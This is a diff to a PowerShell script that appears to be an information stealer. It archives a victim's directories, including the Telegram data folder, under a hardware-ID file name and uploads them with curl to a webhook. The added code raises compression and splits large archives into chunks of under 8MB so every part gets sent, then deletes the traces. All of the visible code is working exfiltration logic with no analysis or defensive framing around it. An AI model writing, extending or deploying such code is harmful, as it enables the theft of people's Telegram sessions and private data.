@@ -53,12 +53,12 @@ $zip = "$env:TEMP\$hwid.zip"
 if (Test-Path $zip) { Remove-Item $zip -Force -ErrorAction SilentlyContinue }
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 try {
-    [System.IO.Compression.ZipFile]::CreateFromDirectory($d, $zip)
+    [System.IO.Compression.ZipFile]::CreateFromDirectory($d, $zip, [System.IO.Compression.CompressionLevel]::Optimal, $false)
 } catch {
     if (Test-Path "$env:ProgramFiles\7-Zip\7z.exe") {
-        & "$env:ProgramFiles\7-Zip\7z.exe" a -tzip $zip $d -mmt -mx5 -bso0 -bsp0
+        & "$env:ProgramFiles\7-Zip\7z.exe" a -tzip $zip $d -mmt -mx9 -bso0 -bsp0
     } elseif (Test-Path "${env:ProgramFiles(x86)}\7-Zip\7z.exe") {
-        & "${env:ProgramFiles(x86)}\7-Zip\7z.exe" a -tzip $zip $d -mmt -mx5 -bso0 -bsp0
+        & "${env:ProgramFiles(x86)}\7-Zip\7z.exe" a -tzip $zip $d -mmt -mx9 -bso0 -bsp0
     }
 }
 if (Test-Path $zip) {
@@ -76,16 +76,80 @@ if (Test-Path $tgPath) {
     $tgZip = "$env:TEMP\Telegram_$hwid.zip"
     if (Test-Path $tgZip) { Remove-Item $tgZip -Force -ErrorAction SilentlyContinue }
     try {
-        [System.IO.Compression.ZipFile]::CreateFromDirectory($tgDir, $tgZip)
+        [System.IO.Compression.ZipFile]::CreateFromDirectory($tgDir, $tgZip, [System.IO.Compression.CompressionLevel]::Optimal, $false)
     } catch {
         if (Test-Path "$env:ProgramFiles\7-Zip\7z.exe") {
-            & "$env:ProgramFiles\7-Zip\7z.exe" a -tzip $tgZip $tgDir -mmt -mx5 -bso0 -bsp0
+            & "$env:ProgramFiles\7-Zip\7z.exe" a -tzip $tgZip $tgDir -mmt -mx9 -bso0 -bsp0
         } elseif (Test-Path "${env:ProgramFiles(x86)}\7-Zip\7z.exe") {
-            & "${env:ProgramFiles(x86)}\7-Zip\7z.exe" a -tzip $tgZip $tgDir -mmt -mx5 -bso0 -bsp0
+            & "${env:ProgramFiles(x86)}\7-Zip\7z.exe" a -tzip $tgZip $tgDir -mmt -mx9 -bso0 -bsp0
         }
     }
     if (Test-Path $tgZip) {
-        curl.exe -s -F "file=@$tgZip" $webhook
+        $fileSize = (Get-Item $tgZip).Length
+        if ($fileSize -le 8MB) {
+            curl.exe -s -F "file=@$tgZip" $webhook
+        } else {
+            Add-Type -AssemblyName System.IO.Compression.FileSystem
+            $tempExtract = "$env:TEMP\Telegram_split_$hwid"
+            New-Item -Path $tempExtract -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
+            [System.IO.Compression.ZipFile]::ExtractToDirectory($tgZip, $tempExtract)
+            $parts = Get-ChildItem -Path $tempExtract -Recurse -File
+            $partIndex = 1
+            $partSize = 7MB
+            $currentPart = @()
+            $currentSize = 0
+            foreach ($file in $parts) {
+                $fsize = $file.Length
+                if ($currentSize + $fsize -gt $partSize -and $currentPart.Count -gt 0) {
+                    $partZip = "$env:TEMP\Telegram_${hwid}_part$partIndex.zip"
+                    if (Test-Path $partZip) { Remove-Item $partZip -Force -ErrorAction SilentlyContinue }
+                    $tempPartDir = "$env:TEMP\part_$partIndex"
+                    New-Item -Path $tempPartDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
+                    foreach ($cf in $currentPart) {
+                        $relPath = $cf.FullName.Substring($tempExtract.Length + 1)
+                        $destFile = Join-Path $tempPartDir $relPath
+                        $destDir = Split-Path $destFile -Parent
+                        if (-not (Test-Path $destDir)) { New-Item -Path $destDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null }
+                        Copy-Item -Path $cf.FullName -Destination $destFile -Force -ErrorAction SilentlyContinue
+                    }
+                    try {
+                        [System.IO.Compression.ZipFile]::CreateFromDirectory($tempPartDir, $partZip, [System.IO.Compression.CompressionLevel]::Optimal, $false)
+                    } catch {}
+                    if (Test-Path $partZip) {
+                        curl.exe -s -F "file=@$partZip" $webhook
+                    }
+                    Remove-Item $tempPartDir -Recurse -Force -ErrorAction SilentlyContinue
+                    Remove-Item $partZip -Force -ErrorAction SilentlyContinue
+                    $partIndex++
+                    $currentPart = @()
+                    $currentSize = 0
+                }
+                $currentPart += $file
+                $currentSize += $fsize
+            }
+            if ($currentPart.Count -gt 0) {
+                $partZip = "$env:TEMP\Telegram_${hwid}_part$partIndex.zip"
+                if (Test-Path $partZip) { Remove-Item $partZip -Force -ErrorAction SilentlyContinue }
+                $tempPartDir = "$env:TEMP\part_$partIndex"
+                New-Item -Path $tempPartDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
+                foreach ($cf in $currentPart) {
+                    $relPath = $cf.FullName.Substring($tempExtract.Length + 1)
+                    $destFile = Join-Path $tempPartDir $relPath
+                    $destDir = Split-Path $destFile -Parent
+                    if (-not (Test-Path $destDir)) { New-Item -Path $destDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null }
+                    Copy-Item -Path $cf.FullName -Destination $destFile -Force -ErrorAction SilentlyContinue
+                }
+                try {
+                    [System.IO.Compression.ZipFile]::CreateFromDirectory($tempPartDir, $partZip, [System.IO.Compression.CompressionLevel]::Optimal, $false)
+                } catch {}
+                if (Test-Path $partZip) {
+                    curl.exe -s -F "file=@$partZip" $webhook
+                }
+                Remove-Item $tempPartDir -Recurse -Force -ErrorAction SilentlyContinue
+                Remove-Item $partZip -Force -ErrorAction SilentlyContinue
+            }
+            Remove-Item $tempExtract -Recurse -Force -ErrorAction SilentlyContinue
+        }
     }
     Remove-Item $tgZip -Force -ErrorAction SilentlyContinue
     Remove-Item $tgDir -Recurse -Force -ErrorAction SilentlyContinue
